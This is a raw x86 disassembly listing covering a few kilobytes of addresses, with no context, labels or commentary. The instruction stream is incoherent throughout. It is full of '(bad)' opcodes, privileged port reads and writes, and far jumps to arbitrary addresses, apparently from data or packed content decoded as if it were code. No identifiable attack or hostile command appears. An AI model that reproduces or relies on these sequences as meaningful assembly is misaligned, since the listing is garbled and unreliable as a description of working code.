  41da6a:	pop    es
  41da6b:	dec    esi
  41da6c:	mov    bl,0x7a
  41da6e:	sbb    al,0xbb
  41da70:	xor    al,0x2f
  41da72:	mov    ds:0x57625a5e,eax
  41da77:	call   0xbb44:0x8c966fd5
  41da7e:	and    al,0x41
  41da80:	sahf   
  41da81:	pop    edx
  41da82:	push   eax
  41da83:	jmp    FWORD PTR [ebx]
  41da85:	(bad)  
  41da86:	xlat   BYTE PTR ds:[ebx]
  41da87:	leave  
  41da88:	(bad)  
  41da8a:	(bad)  
  41da8b:	repz dec edi
  41da8d:	dec    ebx
  41da8e:	xchg   esi,eax
  41da8f:	ins    DWORD PTR es:[edi],dx
  41da90:	sbb    DWORD PTR [ecx],ecx
  41da92:	or     bh,BYTE PTR [ebx+0xe5f2fe3]
  41da98:	enter  0x6d58,0x3
  41da9c:	inc    eax
  41da9d:	inc    esp
  41da9e:	dec    ebp
  41da9f:	cmc    
  41daa0:	xchg   DWORD PTR [esi+0x2cbeed2c],edi
  41daa6:	add    esp,DWORD PTR [ebx*8+0x5d05125]
  41daad:	cmp    al,0xdf
  41daaf:	ds pop esi
  41dab1:	jne    0x41da6b
  41dab3:	jl     0x41dab6
  41dab5:	test   DWORD PTR ds:0x4a34244e,eax
  41dabb:	pop    ecx
  41dabc:	inc    edx
  41dabd:	cs dec esi
  41dabf:	mov    cl,0x9c
  41dac1:	cld    
  41dac2:	dec    eax
  41dac3:	dec    ecx
  41dac4:	add    DWORD PTR ds:0x2137a9ab,edi
  41daca:	cdq    
  41dacb:	loopne 0x41db46
  41dacd:	fldcw  WORD PTR [edi]
  41dacf:	pusha  
  41dad0:	je     0x41db05
  41dad2:	xor    esi,DWORD PTR [esi]
  41dad4:	aas    
  41dad5:	push   ecx
  41dad6:	rep ins BYTE PTR es:[edi],dx
  41dad8:	cmp    bl,BYTE PTR [ecx]
  41dada:	jno    0x41dae7
  41dadc:	popa   
  41dadd:	jmp    0x9d7f55c9
  41dae2:	out    dx,al
  41dae3:	daa    
  41dae4:	daa    
  41dae5:	xchg   esp,eax
  41dae6:	mov    ecx,DWORD PTR [edi]
  41dae8:	sbb    dl,BYTE PTR [edx+0x7a3ba747]
  41daee:	push   ds
  41daef:	enter  0xdc16,0x4f
  41daf3:	fmul   QWORD PTR [ebx+0x77]
  41daf6:	gs repz sub ebx,ebx
  41dafa:	sub    ebp,DWORD PTR [edx+0x4b]
  41dafd:	leave  
  41dafe:	stos   BYTE PTR es:[edi],al
  41daff:	jbe    0x41db0e
  41db01:	mov    ds:0xfda79ae1,al
  41db06:	and    dh,BYTE PTR [ecx+0x76]
  41db09:	or     DWORD PTR [eax-0x66e3121],ebp
  41db0f:	dec    edi
  41db10:	sbb    ecx,DWORD PTR [ebx-0x49e38bcb]
  41db16:	sub    eax,0x56eaa7b7
  41db1b:	jbe    0x41db5a
  41db1d:	cwde   
  41db1e:	enter  0x656c,0xaa
  41db22:	fsub   QWORD PTR [edx-0x36]
  41db25:	int    0x7
  41db27:	mov    bh,0x7c
  41db29:	mov    edi,0x219abef0
  41db2e:	(bad)  
  41db30:	push   ecx
  41db31:	sbb    bl,BYTE PTR [ebp+0x41]
  41db34:	lock cmp DWORD PTR [ebx-0x510f04bf],0xffffffe5
  41db3c:	push   ds
  41db3d:	adc    ch,BYTE PTR [eax+0x22b1afa8]
  41db43:	outs   dx,BYTE PTR cs:[esi]
  41db45:	imul   esi,DWORD PTR [esi-0xfdd5335],0xb14a9279
  41db4f:	jbe    0x41db68
  41db51:	arpl   bp,bx
  41db53:	in     eax,0x33
  41db55:	pop    ds
  41db56:	inc    edi
  41db57:	cmc    
  41db58:	shl    BYTE PTR [edx+0x1efae11],0xe4
  41db5f:	fisttp QWORD PTR [eax]
  41db61:	das    
  41db62:	mov    ebx,0x859d
	...
  41db6f:	add    BYTE PTR [eax],al
  41db71:	inc    ecx
  41db72:	out    dx,eax
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0xb6e5c862
  41db80:	and    ah,BYTE PTR ds:0xac000157
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [esi],dh
  41db8a:	aaa    
  41db8b:	iret   
  41db8c:	in     eax,0x21
  41db8e:	xlat   BYTE PTR ds:[ebx]
  41db8f:	push   ebp
  41db90:	mov    fs,WORD PTR [ebp+0x11]
  41db93:	(bad)  
  41db94:	fsubr  st(7),st
  41db96:	dec    ecx
  41db97:	dec    ecx
  41db98:	nop
  41db99:	stos   DWORD PTR es:[edi],eax
  41db9a:	pushf  
  41db9b:	pop    ebp
  41db9c:	lds    eax,FWORD PTR [ebp+edx*1-0x65]
  41dba0:	scas   al,BYTE PTR es:[edi]
  41dba1:	sub    eax,0x15ac59e3
  41dba6:	mov    BYTE PTR [ecx-0x1efdbd],al
  41dbac:	sbb    ecx,DWORD PTR [ebx]
  41dbae:	and    eax,0x16745a34
  41dbb3:	jl     0x41db64
  41dbb5:	cmp    edi,esi
  41dbb7:	pop    ebx
  41dbb8:	xor    dh,bh
  41dbba:	repnz adc dh,bl
  41dbbd:	mov    edx,DWORD PTR [esi+0x6714d829]
  41dbc3:	adc    bh,BYTE PTR [esp+eiz*8]
  41dbc6:	rcl    ah,0x32
  41dbc9:	or     DWORD PTR [ebx+ecx*1+0x72],esi
  41dbcd:	cmp    DWORD PTR [eax+0x78],esp
  41dbd0:	mov    dl,0xf1
  41dbd2:	mov    ebx,0x664ceb8e
  41dbd7:	inc    eax
  41dbd8:	sbb    eax,0x2f743b53
  41dbdd:	push   0x3e
  41dbdf:	push   es
  41dbe0:	inc    edx
  41dbe1:	js     0x41dc2b
  41dbe3:	add    dl,BYTE PTR [esp+ecx*8+0x484882cc]
  41dbea:	cmp    dl,BYTE PTR [esi]
  41dbec:	adc    DWORD PTR [esi],esp
  41dbee:	stc    
  41dbef:	shl    esp,0x18
  41dbf2:	fstp   QWORD PTR [ebx]
  41dbf4:	xchg   DWORD PTR [ebx+0x45a0e63c],ebp
  41dbfa:	out    0x7c,al
  41dbfc:	call   0xf0e0:0x454c27d0
  41dc03:	gs retf 
  41dc05:	jp     0x41dbb3
  41dc07:	mov    ds,WORD PTR [ebx-0x41926e83]
  41dc0d:	jg     0x41dbe4
  41dc0f:	mov    al,ds:0x73818e5a
  41dc14:	je     0x41dc84
  41dc16:	push   ss
  41dc17:	mov    ah,0x91
  41dc19:	inc    esp
  41dc1a:	imul   ebx,DWORD PTR [ecx],0x75c37545
  41dc20:	lock mov WORD PTR cs:[esi+0x6a83b5b0],ds
  41dc28:	cmc    
  41dc29:	and    DWORD PTR [edx+0x73bd74ec],esp
  41dc2f:	ins    BYTE PTR es:[edi],dx
  41dc30:	sub    DWORD PTR [esi],0xffffffe1
  41dc33:	xchg   ebp,eax
  41dc34:	adc    cl,BYTE PTR es:[eax+0x5483b30c]
  41dc3b:	(bad)  
  41dc3c:	pop    ebp
  41dc3d:	sbb    eax,esi
  41dc3f:	push   ds
  41dc40:	pusha  
  41dc41:	push   0x6
  41dc43:	push   ss
  41dc44:	jge    0x41dca6
  41dc46:	mov    cl,0x8c
  41dc48:	inc    DWORD PTR [di+0x58ea]
  41dc4d:	adc    eax,0x6cc951fb
  41dc52:	and    DWORD PTR [edi],esp
  41dc54:	cvtdq2ps xmm0,XMMWORD PTR [ebx]
  41dc57:	out    dx,al
  41dc58:	push   esp
  41dc59:	les    esi,FWORD PTR [ebp-0x40]
  41dc5c:	inc    ebp
  41dc5d:	pop    es
  41dc5e:	push   es
  41dc5f:	sub    eax,0xe8e3f7d5
  41dc64:	lahf   
  41dc65:	adc    BYTE PTR [edx],al
  41dc67:	push   eax
  41dc68:	push   ds
  41dc69:	cmp    al,0x7e
  41dc6b:	inc    esp
  41dc6c:	in     al,dx
  41dc6d:	imul   ebp,ebx,0x75
  41dc70:	fwait
  41dc71:	ret    0x9897
  41dc74:	retf   0xa9c4
  41dc77:	clc    
  41dc78:	fdiv   QWORD PTR [edx]
  41dc7a:	ss dec ecx
  41dc7c:	mov    ch,0xbd
  41dc7e:	cld    
  41dc7f:	mov    edi,0xf6186d06
  41dc84:	push   edi
  41dc85:	enter  0x8ad3,0xe8
  41dc89:	mov    ah,0xff
  41dc8b:	pop    bp
  41dc8d:	push   edi
  41dc8e:	inc    ebp
  41dc8f:	jb     0x41dccd
  41dc91:	push   0xffffffeb
  41dc93:	inc    ebx
  41dc94:	retf   
  41dc95:	xor    al,0xae
  41dc97:	inc    esi
  41dc98:	add    dh,BYTE PTR [esp]
  41dc9b:	mov    ebx,0x84c1caf
  41dca0:	fs inc edx
  41dca2:	fs out dx,al
  41dca4:	(bad)  
  41dca5:	loope  0x41dd12
  41dca7:	sahf   
  41dca8:	das    
  41dca9:	ror    BYTE PTR [eax-0x1],1
  41dcac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcad:	and    DWORD PTR [edx+0x37f727fa],edx
  41dcb3:	mov    al,dl
  41dcb5:	cmp    DWORD PTR cs:[edx+eax*8-0x20],eax
  41dcba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcbb:	add    al,0x40
  41dcbd:	or     BYTE PTR [ebp+0x79],bh
  41dcc0:	ja     0x41dd35
  41dcc2:	add    eax,0xb7c12c89
  41dcc7:	mov    ecx,0x14e9b578
  41dccc:	scas   al,BYTE PTR es:[edi]
  41dccd:	cmp    al,0xf
  41dccf:	jecxz  0x41dcad
  41dcd1:	add    al,0x63
  41dcd3:	jb     0x41dc9e
  41dcd5:	mov    esi,0xb03ead7d
  41dcda:	mov    ds:0x8f0dfb97,al
  41dcdf:	nop
  41dce0:	add    BYTE PTR [edi-0x6b327720],ch
  41dce6:	fwait
  41dce7:	push   0x1650468f
  41dcec:	add    al,0x33
  41dcee:	mov    al,ds:0x56c9f1c8
  41dcf3:	mov    DWORD PTR [ebx+0x5b],0xb70efed7
  41dcfa:	retf   
  41dcfb:	xor    esp,ebx
  41dcfd:	out    dx,al
  41dcfe:	in     eax,dx
  41dcff:	jge    0x41dd10
  41dd01:	shl    DWORD PTR [ebx-0x7b73282c],0xc
  41dd08:	dec    ecx
  41dd09:	in     al,0xb0
  41dd0b:	push   0x6
  41dd0d:	in     eax,dx
  41dd0e:	mov    eax,DWORD PTR [edx-0x65b3b508]
  41dd14:	sub    DWORD PTR [edx],edx
  41dd16:	jmp    0x335:0x9186ef80
  41dd1d:	daa    
  41dd1e:	push   ds
  41dd1f:	inc    eax
  41dd20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd21:	cmp    ecx,0x22
  41dd24:	cdq    
  41dd25:	lea    esi,[eax]
  41dd27:	mov    bl,dh
  41dd29:	fpatan 
  41dd2b:	lods   al,BYTE PTR ds:[esi]
  41dd2c:	xchg   ebx,eax
  41dd2d:	(bad)  
  41dd2e:	sbb    al,0x75
  41dd30:	into   
  41dd31:	ja     0x41dce9
  41dd33:	jg     0x41dd21
  41dd35:	stc    
  41dd36:	jecxz  0x41dd8a
  41dd38:	sahf   
  41dd39:	xchg   ebx,eax
  41dd3a:	inc    ebx
  41dd3b:	mov    bh,0xe2
  41dd3d:	fld    TBYTE PTR [edi-0x5de2acb9]
  41dd43:	pop    ebx
  41dd44:	mov    ebp,0x3ee466be
  41dd49:	pop    ebp
  41dd4a:	jmp    0x41ddb2
  41dd4c:	popf   
  41dd4d:	data16 sub al,0x87
  41dd50:	(bad)  
  41dd51:	(bad)  
  41dd52:	mov    al,0x32
  41dd54:	add    esp,DWORD PTR [edi]
  41dd56:	mov    ds:0xcc5b38ba,al
  41dd5b:	shr    BYTE PTR ds:0x240eac2b,cl
  41dd61:	mov    bl,0x38
  41dd63:	sbb    cl,BYTE PTR [ebx-0x62]
  41dd66:	mov    ebx,0xb8cf3f2a
  41dd6b:	sub    BYTE PTR [ebx-0x1a],bl
  41dd6e:	sub    eax,0x157a9848
  41dd73:	xchg   edi,eax
  41dd74:	hlt    
  41dd75:	ror    BYTE PTR [eax+0x6f77fb0c],1
  41dd7b:	rcr    WORD PTR [esi],1
  41dd7e:	cmp    BYTE PTR [edx+0x13],bh
  41dd81:	mov    ds:0x120faf3,al
  41dd86:	call   0x27a3:0x1ac4d7f7
  41dd8d:	push   esi
  41dd8e:	daa    
  41dd8f:	and    BYTE PTR [ebx-0x7b],0x9
  41dd93:	cmp    bh,BYTE PTR [ebx]
  41dd95:	jmp    0x9f71:0x8f2b9724
  41dd9c:	icebp  
  41dd9d:	dec    esp
  41dd9e:	iret   
  41dd9f:	cmp    BYTE PTR ds:0x29572f1c,bl
  41dda5:	cli    
  41dda6:	mov    ebx,0x7f7a94d8
  41ddab:	mov    bh,0x44
  41ddad:	xchg   edi,eax
  41ddae:	inc    edi
  41ddaf:	enter  0xa552,0xaf
  41ddb3:	sar    edx,cl
  41ddb5:	add    eax,0x2a21aae9
  41ddba:	dec    esp
  41ddbb:	xchg   esp,eax
  41ddbc:	pop    ebx
  41ddbd:	scas   eax,DWORD PTR es:[edi]
  41ddbe:	pop    ebx
  41ddbf:	div    DWORD PTR [esi-0x58]
  41ddc2:	call   0x55c1c0d6
  41ddc7:	ss hlt 
  41ddc9:	leave  
  41ddca:	mov    dl,0xae
  41ddcc:	cdq    
  41ddcd:	push   edx
  41ddce:	pop    ss
  41ddcf:	out    0x2f,al
  41ddd1:	sbb    edi,esi
  41ddd3:	add    ebp,ecx
  41ddd5:	aas    
  41ddd6:	dec    ebp
  41ddd7:	fisubr WORD PTR [ebx-0x46]
  41ddda:	mov    bl,0x11
  41dddc:	pop    es
  41dddd:	neg    DWORD PTR [ebx]
  41dddf:	fist   DWORD PTR [edi-0x1f]
  41dde2:	sub    BYTE PTR ds:0x6db0ab45,cl
  41dde8:	pop    ds
  41dde9:	mov    esi,0x5a57573b
  41ddee:	jo     0x41de3e
  41ddf0:	outs   dx,BYTE PTR ds:[esi]
  41ddf2:	adc    DWORD PTR [esi+0x1a6795c7],0xffffffb1
  41ddf9:	jno    0x41de6a
  41ddfb:	in     eax,dx
  41ddfc:	repz mov esp,0xbc452295
  41de02:	cmp    ecx,DWORD PTR [eax+0x0]
  41de05:	pop    ecx
  41de06:	test   DWORD PTR [ecx*2-0x74210b2f],0x30a65290
  41de11:	adc    dh,bh
  41de13:	(bad)  
  41de14:	jne    0x41de94
  41de16:	and    eax,0x443012e7
  41de1b:	xchg   edx,eax
  41de1c:	xchg   edx,eax
  41de1d:	cmp    bh,BYTE PTR cs:[ebx+esi*1+0x484e9cf8]
  41de25:	mov    bl,0xff
  41de27:	sbb    bl,dl
  41de29:	push   ds
  41de2a:	jbe    0x41de1d
  41de2c:	aaa    
  41de2d:	hlt    
  41de2e:	or     BYTE PTR [ebp+0x63],ch
  41de31:	mul    esp
  41de33:	sahf   
  41de34:	ret    
  41de35:	jne    0x41de31
  41de37:	ins    DWORD PTR es:[edi],dx
  41de38:	popa   
  41de39:	stos   DWORD PTR es:[edi],eax
  41de3a:	(bad)  
  41de3b:	fmul   DWORD PTR [edi-0x1febc0a3]
  41de41:	mov    esp,DWORD PTR [edx]
  41de43:	enter  0xfd72,0xd2
  41de47:	gs shr ebp,0x3c
  41de4b:	vminsd xmm6,xmm2,xmm5
  41de4f:	nop
  41de50:	pop    ss
  41de51:	popa   
  41de52:	add    BYTE PTR fs:[ecx+0x3d],0xd7
  41de57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de58:	sbb    eax,0x28e1e530
  41de5d:	mov    edi,0x43836a98
  41de62:	hlt    
  41de63:	pop    esp
  41de64:	mov    ds:0x6e73a553,al
  41de69:	xchg   ecx,eax
  41de6a:	das    
  41de6b:	and    BYTE PTR [edx+0x1cd0ca40],ah
  41de71:	adc    edi,DWORD PTR [edx]
  41de73:	inc    edx
  41de74:	jo     0x41de55
  41de76:	adc    edx,DWORD PTR [esi+0x2569198c]
  41de7c:	(bad)  
  41de7e:	mov    dl,0x6
  41de80:	adc    BYTE PTR [eax],al
  41de82:	rcl    edx,0x1e
  41de85:	sahf   
  41de86:	mov    dl,0x15
  41de88:	pop    edx
  41de89:	sub    ch,BYTE PTR [edx*8+0x6fdcca79]
  41de90:	push   eax
  41de91:	or     DWORD PTR [ebp+0xe7de184],0xadf4bf33
  41de9b:	retf   0x8e90
  41de9e:	xchg   ecx,eax
  41de9f:	adc    al,0x53
  41dea1:	add    BYTE PTR [ecx+esi*1-0x4703aad8],ch
  41dea8:	pop    esp
  41dea9:	or     DWORD PTR [ecx+0x1249e47e],esi
  41deaf:	xchg   esi,eax
  41deb0:	cs std 
  41deb2:	lods   al,BYTE PTR es:[esi]
  41deb4:	inc    ebx
  41deb5:	mov    BYTE PTR [edi+0x13f6e97f],bl
  41debb:	retf   
  41debc:	or     al,0x5
  41debe:	xchg   ebp,eax
  41debf:	ja     0x41debd
  41dec1:	iret   
  41dec2:	xor    DWORD PTR [edi],edi
  41dec4:	mov    WORD PTR [edi],ds
  41dec6:	pusha  
  41dec7:	inc    esp
  41dec8:	and    BYTE PTR [edi+esi*1+0x56],0x67
  41decd:	jge    0x41df4e
  41decf:	jecxz  0x41de5a
  41ded1:	inc    ebp
  41ded2:	fs aaa 
  41ded4:	or     al,0x7d
  41ded6:	rol    BYTE PTR [ebx-0x126725d8],1
  41dedc:	push   es
  41dedd:	sub    bl,bh
  41dedf:	(bad)  
  41dee0:	and    edx,eax
  41dee2:	push   esp
  41dee3:	pushf  
  41dee4:	sbb    eax,0x187a8102
  41dee9:	mov    WORD PTR [edi+0x39],es
  41deec:	sub    eax,0xc8b542da
  41def1:	inc    edi
  41def2:	lahf   
  41def3:	jmp    0x2c01:0x3e7284af
  41defa:	jmp    0x41df77
  41defc:	pop    edx
  41defd:	fldenv [ebp-0x7f]
  41df00:	pop    ds
  41df01:	jmp    0x41deef
  41df03:	repz fild DWORD PTR [ebx-0x62ae0af9]
  41df0a:	(bad)  
  41df0b:	stos   DWORD PTR es:[edi],eax
  41df0c:	outs   dx,BYTE PTR ds:[esi]
  41df0d:	push   edx
  41df0e:	mov    esp,0x12d260bd
  41df13:	fidivr DWORD PTR ds:0x9048eb52
  41df19:	push   cs
  41df1a:	cmp    eax,0xf341563
  41df1f:	icebp  
  41df20:	int    0x58
  41df22:	mov    DWORD PTR [ecx],ebp
  41df24:	mov    ds:0xebef569d,eax
  41df29:	popa   
  41df2a:	daa    
  41df2b:	into   
  41df2c:	push   ss
  41df2d:	sub    al,BYTE PTR [edi-0x47]
  41df30:	adc    DWORD PTR ds:0x611f14,esp
	...
  41df3e:	add    BYTE PTR [eax],al
  41df40:	add    BYTE PTR ds:0x7f7d7f79,dl
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	sbb    dh,0xbb
  41df4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df50:	loopne 0x41df23
  41df52:	pop    edx
  41df53:	add    DWORD PTR [eax],eax
  41df55:	lods   al,BYTE PTR ds:[esi]
  41df56:	add    eax,DWORD PTR [eax]
  41df58:	add    ah,ah
  41df5a:	fs fdiv st,st(0)
  41df5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df5e:	jl     0x41dfaf
  41df60:	in     eax,0x8f
  41df62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df63:	mov    esp,0xddc988a1
  41df68:	ss repz test WORD PTR fs:[ecx],bx
  41df6e:	sahf   
  41df6f:	xchg   edi,eax
  41df70:	lds    ecx,FWORD PTR [eax]
  41df72:	in     al,0xa4
  41df74:	aad    0xbd
  41df76:	push   cs
  41df77:	mov    edx,esp
  41df79:	call   0x2961b195
  41df7e:	xor    eax,0xe27c5eb5
  41df83:	call   0x5e53e06c
  41df88:	outs   dx,DWORD PTR ds:[esi]
  41df89:	mov    ch,0x98
  41df8b:	or     BYTE PTR [eax],0xd
  41df8e:	es clc 
  41df90:	clc    
  41df91:	(bad)  [ecx-0x7e2def92]
  41df97:	test   DWORD PTR [ecx+0x1d],eax
  41df9a:	pop    esp
  41df9b:	add    ebx,DWORD PTR [esi]
  41df9d:	je     0x41df3d
  41df9f:	or     eax,0x29b0a8e2
  41dfa4:	enter  0x998c,0xfd
  41dfa8:	mov    edx,DWORD PTR [eax+0x19]
  41dfab:	inc    ecx
  41dfac:	xchg   DWORD PTR [esi],edi
  41dfae:	outs   dx,DWORD PTR ds:[esi]
  41dfaf:	js     0x41dfa1
  41dfb1:	not    DWORD PTR [ecx-0x68]
  41dfb4:	stc    
  41dfb5:	mov    ?,WORD PTR [ecx+esi*4-0xd]
  41dfb9:	fadd   st,st(4)
  41dfbb:	sub    BYTE PTR [ecx+0x56792fe9],al
  41dfc1:	add    al,0x4b
  41dfc3:	pop    ebx
  41dfc4:	push   edi
  41dfc5:	xchg   ecx,eax
  41dfc6:	rcr    al,1
  41dfc8:	fld    DWORD PTR [edx]
  41dfca:	hlt    
  41dfcb:	ret    0x93e7
  41dfce:	gs or  edi,ebp
  41dfd1:	and    BYTE PTR [ebp-0x4b],0x57
  41dfd5:	mov    bh,0xe0
  41dfd7:	ss sub al,0x57
  41dfda:	mov    cl,0xd9
  41dfdc:	or     eax,0xfb973c34
  41dfe1:	outs   dx,BYTE PTR ds:[esi]
  41dfe2:	xor    bl,bh
  41dfe4:	enter  0x818,0xbc
  41dfe8:	mov    eax,0x9f3f3011
  41dfed:	xchg   ebp,eax
  41dfee:	std    
  41dfef:	jb     0x41dfab
  41dff1:	fwait
  41dff2:	ret    0xeff8
  41dff5:	jge    0x41dfc1
  41dff7:	(bad)  [ecx]
  41dff9:	fdiv   QWORD PTR [edi+edx*4-0x2ce71f94]
  41e000:	jl     0x41dfd5
  41e002:	fisub  WORD PTR [esi+0x21]
  41e005:	and    eax,0x8c2ead64
  41e00a:	imul   eax,DWORD PTR [ebx+0x7d],0xffffffb0
  41e00e:	out    dx,al
  41e00f:	jp     0x41e05b
  41e011:	cli    
  41e012:	mov    edi,0x699d8fcb
  41e017:	jns    0x41dfe7
  41e019:	imul   eax,DWORD PTR [eax-0x75],0xe81bac16
  41e020:	shl    DWORD PTR [ebx],cl
  41e022:	repnz and edi,DWORD PTR [edx+eiz*8+0x5889008f]
  41e02a:	cdq    
  41e02b:	cmp    eax,ebx
  41e02d:	add    DWORD PTR [ecx+0x0],eax
  41e030:	add    bl,BYTE PTR [eax-0x694432ef]
  41e036:	pop    ss
  41e037:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e038:	mov    edi,0x58413a9f
  41e03d:	sbb    cl,ch
  41e03f:	repnz push edi
  41e041:	sti    
  41e042:	scas   al,BYTE PTR es:[edi]
  41e043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e044:	arpl   WORD PTR [ebp-0x75b9a9d8],sp
  41e04a:	pop    eax
  41e04b:	push   ds
  41e04c:	mov    DWORD PTR [ebx-0x5c],0xf4dd6e8b
  41e053:	dec    edi
  41e054:	std    
  41e055:	popf   
  41e056:	jns    0x41e0a2
  41e058:	test   DWORD PTR [ebp-0x7c],ebp
  41e05b:	es cs data16 int 0xcf
  41e060:	push   ds
  41e061:	push   0xffffffc9
  41e063:	mov    ch,0x3d
  41e065:	adc    eax,0x95868df
  41e06a:	(bad)  
  41e06b:	jns    0x41e038
  41e06d:	jae    0x41e0a4
  41e06f:	retf   
  41e070:	cmp    eax,0x54f9d5d0
  41e075:	out    dx,eax
  41e076:	cmp    al,BYTE PTR [edi-0x3bd9c727]
  41e07c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e07d:	out    dx,eax
  41e07e:	pop    eax
  41e07f:	adc    eax,0x7b6715f5
  41e084:	push   ds
  41e085:	xor    al,0xfb
  41e087:	rol    cl,1
  41e089:	dec    esp
  41e08a:	mul    DWORD PTR [ebx+0x6779aa0c]
  41e090:	mov    al,ds:0xee7b6f79
  41e095:	add    edi,eax
  41e097:	push   ss
  41e098:	sub    BYTE PTR [ebp-0x9047f49],ch
  41e09e:	inc    esp
  41e09f:	cmp    eax,0xe6e4a75c
  41e0a4:	jg     0x41e02a
  41e0a6:	cmp    ecx,eax
  41e0a8:	mov    ebp,ecx
  41e0aa:	(bad)  
  41e0ab:	and    BYTE PTR ss:[ecx*8+0x7bddb21a],dh
  41e0b3:	ins    BYTE PTR es:[edi],dx
  41e0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0b5:	sub    eax,0x8de730d0
  41e0ba:	and    eax,DWORD PTR [ebp-0x17afa0b2]
  41e0c0:	loop   0x41e119
  41e0c2:	scas   eax,DWORD PTR es:[edi]
  41e0c3:	aas    
  41e0c4:	cld    
  41e0c5:	(bad)  [ebp+0x1e]
  41e0c8:	sub    BYTE PTR ds:0x9fe19890,dl
  41e0ce:	aad    0x28
  41e0d0:	call   FWORD PTR [eax]
  41e0d2:	cli    
  41e0d3:	sub    eax,DWORD PTR [edi-0x6af0fd86]
  41e0d9:	loope  0x41e094
  41e0db:	mov    bh,0xf0
  41e0dd:	cmp    al,0xa5
  41e0df:	iret   
  41e0e0:	and    DWORD PTR [ebp+0x26974a50],esp
  41e0e6:	xor    al,0xc2
  41e0e8:	dec    esi
  41e0e9:	sbb    al,0x45
  41e0eb:	push   esi
  41e0ec:	mov    edi,?
  41e0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ef:	and    esp,0x19
  41e0f2:	sbb    BYTE PTR [edi],ch
  41e0f4:	out    dx,al
  41e0f5:	xchg   DWORD PTR [eax],ebx
  41e0f7:	fild   WORD PTR [ebx]
  41e0f9:	add    eax,0x4f8ce1b8
  41e0fe:	mov    ds:0x5a9881c0,eax
  41e103:	dec    eax
  41e104:	bound  esi,QWORD PTR [edx]
  41e106:	push   es
  41e107:	fs xor eax,0x6fac1b06
  41e10d:	mov    al,0x86
  41e10f:	js     0x41e0ba
  41e111:	adc    DWORD PTR [ebx-0x56],0x28
  41e115:	push   esi
  41e116:	imul   ebx,DWORD PTR ds:0x2c3c82a6,0xdbf5367c
  41e120:	enter  0x9fc6,0x6e
  41e124:	xor    DWORD PTR [edx+0x67],esi
  41e127:	outs   dx,BYTE PTR ds:[esi]
  41e128:	jmp    0x78f388fe
  41e12d:	icebp  
  41e12e:	bound  esp,QWORD PTR [ebx+0x7c9e678c]
  41e134:	les    ecx,FWORD PTR [ecx]
  41e136:	in     eax,0x50
  41e138:	sbb    al,0xff
  41e13a:	jbe    0x41e17a
  41e13c:	or     BYTE PTR [ebx-0x10],0x10
  41e140:	jg     0x41e102
  41e142:	sub    DWORD PTR [edi],esp
  41e144:	lds    esi,FWORD PTR [esi]
  41e146:	aaa    
  41e147:	add    DWORD PTR [edx+0x1c],ebx
  41e14a:	(bad)  
  41e14b:	inc    eax
  41e14c:	cmp    eax,0x6a7fbb29
  41e151:	jl     0x41e140
  41e153:	pop    edi
  41e154:	pop    es
  41e155:	out    0xa8,eax
  41e157:	add    BYTE PTR [esi+ebx*4+0x427847ce],dh
  41e15e:	(bad)  
  41e15f:	sar    cl,1
  41e161:	sbb    ebx,DWORD PTR [edx-0x3124b95a]
  41e167:	or     edi,DWORD PTR ds:0xde2b7c98
  41e16d:	push   0xfffffff0
  41e16f:	cmp    esi,ebp
  41e171:	leave  
  41e172:	dec    eax
  41e173:	dec    ecx
  41e174:	jg     0x41e0f8
  41e176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e177:	pop    ebx
  41e178:	pop    ebp
  41e179:	jmp    0xd47a18c4
  41e17e:	lds    edi,FWORD PTR [ecx+eax*1-0x3ab56a48]
  41e185:	cmp    bh,BYTE PTR [ebx]
  41e187:	xchg   ebx,eax
  41e188:	pop    ds
  41e189:	push   es
  41e18a:	xchg   BYTE PTR [eax],ch
  41e18c:	icebp  
  41e18d:	lahf   
  41e18e:	out    0x62,eax
  41e190:	ja     0x41e1de
  41e192:	fcmovb st,st(2)
  41e194:	add    al,0xc4
  41e196:	xchg   BYTE PTR ds:0xacc7ce82,dh
  41e19c:	xchg   esp,eax
  41e19d:	cmp    al,0x5a
  41e19f:	xchg   esi,eax
  41e1a0:	or     eax,0x35a1b905
  41e1a5:	in     al,0x5b
  41e1a7:	jge    0x41e16c
  41e1a9:	cmp    eax,0x3ab4ae43
  41e1af:	stos   BYTE PTR es:[edi],al
  41e1b0:	aas    
  41e1b1:	push   ss
  41e1b2:	sub    eax,0xa9a575f6
  41e1b7:	xor    dh,BYTE PTR [edi-0x7ffa8439]
  41e1bd:	popa   
  41e1be:	push   ss
  41e1bf:	int3   
  41e1c0:	out    0x41,eax
  41e1c2:	jecxz  0x41e206
  41e1c4:	inc    esi
  41e1c5:	ds push esi
  41e1c7:	inc    ecx
  41e1c8:	repz adc al,dh
  41e1cb:	pop    ecx
  41e1cc:	pop    ss
  41e1cd:	sbb    eax,0xf22029d
  41e1d2:	test   al,0x11
  41e1d4:	add    ecx,DWORD PTR [edx]
  41e1d6:	sti    
  41e1d7:	mov    WORD PTR [ebx],fs
  41e1d9:	dec    edi
  41e1da:	sub    al,0x38
  41e1dc:	xchg   ecx,eax
  41e1dd:	xchg   ebp,eax
  41e1de:	jae    0x41e1aa
  41e1e0:	dec    edx
  41e1e1:	shl    BYTE PTR [edx-0x5d2833bb],cl
  41e1e7:	test   al,0x8d
  41e1e9:	outs   dx,DWORD PTR ds:[esi]
  41e1ea:	(bad)  
  41e1eb:	or     DWORD PTR [esi-0x4f],edi
  41e1ee:	sub    DWORD PTR [ebx-0x35],ebp
  41e1f1:	add    DWORD PTR ds:0x2c174d1d,eax
  41e1f7:	dec    ebp
  41e1f8:	aad    0x87
  41e1fa:	fs enter 0x27f7,0x16
